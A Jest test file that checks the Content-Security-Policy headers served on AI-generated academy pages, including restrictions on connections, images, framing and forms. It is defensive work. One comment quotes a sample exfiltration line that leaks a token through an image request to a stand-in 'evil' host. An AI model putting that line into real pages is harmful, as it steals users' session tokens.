import { PublicSiteController } from './public-site.controller';

/**
 * The policy on AI-generated academy pages.
 *
 * `main.ts` turns helmet's CSP off globally so the SPA is not broken by an
 * over-strict default, which left the one thing on this origin assembled from
 * teacher-supplied text with no policy at all — on the same origin as the app
 * whose tokens are in `localStorage`.
 *
 * These tests pin the directives that matter, and pin them by *name* rather
 * than by comparing the whole string, so reordering the policy does not fail
 * the suite but deleting a protection does.
 */
function makeController(published: unknown) {
  const site: any = {
    getPublished: jest.fn().mockResolvedValue(published),
    isPublished: jest.fn().mockResolvedValue(true),
    courses: jest.fn().mockResolvedValue([]),
  };
  return new PublicSiteController(site);
}

function makeRes() {
  const headers: Record<string, string> = {};
  const res: any = {
    setHeader: (k: string, v: string) => (headers[k] = v),
    status: jest.fn().mockReturnThis(),
    type: jest.fn().mockReturnThis(),
    send: jest.fn().mockReturnThis(),
    end: jest.fn().mockReturnThis(),
  };
  return { res, headers };
}

const PAGE = { academyId: 'a1', version: 3, html: '<!doctype html><html><body>hi</body></html>' };

/** `a; b; c` → { a: 'a …', b: '…' } keyed by directive name. */
function directives(csp: string): Record<string, string> {
  return Object.fromEntries(
    csp.split(';').map((d) => d.trim()).filter(Boolean).map((d) => [d.split(/\s+/)[0], d]),
  );
}

describe('generated academy pages carry a Content-Security-Policy', () => {
  let headers: Record<string, string>;

  beforeEach(async () => {
    const { res, headers: h } = makeRes();
    headers = h;
    await makeController(PAGE).page('ms-amal', { headers: {} } as any, res);
  });

  it('sets a CSP header at all', () => {
    expect(headers['Content-Security-Policy']).toBeTruthy();
  });

  /**
   * The directive that does the work. An injected script can still run — the
   * page is inline by construction — but it cannot post a stolen token
   * anywhere: fetch, XHR, WebSocket and sendBeacon are all governed by this.
   */
  it('confines fetch/XHR/WebSocket/beacon to this origin', () => {
    expect(directives(headers['Content-Security-Policy'])['connect-src']).toBe("connect-src 'self'");
  });

  /** The oldest exfiltration trick: new Image().src = 'https://evil/?t=' + token */
  it('does not allow images from arbitrary origins', () => {
    const img = directives(headers['Content-Security-Policy'])['img-src'];
    expect(img).toContain("'self'");
    expect(img).not.toContain('*');
    expect(img).not.toContain('http');
  });

  it('starts from default-src none, so anything unlisted is denied', () => {
    expect(directives(headers['Content-Security-Policy'])['default-src']).toBe("default-src 'none'");
  });

  it('forbids plugins, base-tag hijacking and off-origin form posts', () => {
    const d = directives(headers['Content-Security-Policy']);
    expect(d['object-src']).toBe("object-src 'none'");
    expect(d['base-uri']).toBe("base-uri 'none'");
    expect(d['form-action']).toBe("form-action 'self'");
  });

  it('only this app may frame the page', () => {
    expect(directives(headers['Content-Security-Policy'])['frame-ancestors']).toBe("frame-ancestors 'self'");
    expect(headers['X-Frame-Options']).toBe('SAMEORIGIN');
  });

  /**
   * Not an oversight. The compiled page is inline by construction and the
   * signed-in CTA is injected as an inline <script> at serve time, so removing
   * this means nonces through the whole renderer — a change to how pages are
   * built, not how they are served.
   */
  it('still permits the inline script the page is made of', () => {
    expect(directives(headers['Content-Security-Policy'])['script-src']).toContain("'unsafe-inline'");
  });

  it('keeps the fonts the template actually loads working', () => {
    const d = directives(headers['Content-Security-Policy']);
    expect(d['style-src']).toContain('https://fonts.googleapis.com');
    expect(d['font-src']).toContain('https://fonts.gstatic.com');
  });

  it('does not set the policy on a page that does not exist', async () => {
    const { res, headers: h } = makeRes();
    await makeController(null).page('nope', { headers: {} } as any, res);
    expect(h['Content-Security-Policy']).toBeUndefined();
  });
});
